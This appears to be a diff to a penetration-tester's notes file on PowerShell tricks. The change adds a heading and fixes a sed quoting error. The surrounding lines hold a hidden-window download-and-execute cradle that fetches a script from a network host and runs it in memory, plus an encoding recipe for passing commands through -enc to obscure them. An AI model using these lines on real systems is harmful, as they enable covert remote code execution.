@@ -4,6 +4,8 @@
 
 Location of 64bit ppowershell
 
+==== Snipplets
+
   powershell.exe -w hidden -noni -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.2/script.ps1');"
 
 Download a powershell script to memory and run it.
@@ -12,7 +14,7 @@ Download a powershell script to memory and run it.
 
 Same as above, but doesn't use either quote type.
 
-  echo | iconv -f utf-8 -t utf-16 -c | sed 's/^\xff\xfe// | base64 -w 0
+  echo | iconv -f utf-8 -t utf-16 -c | sed 's/^\xff\xfe//' | base64 -w 0
 
 Convert powershell to utf-16, strip the first two marker bytes, then convert it to base64 for the -enc command.
 
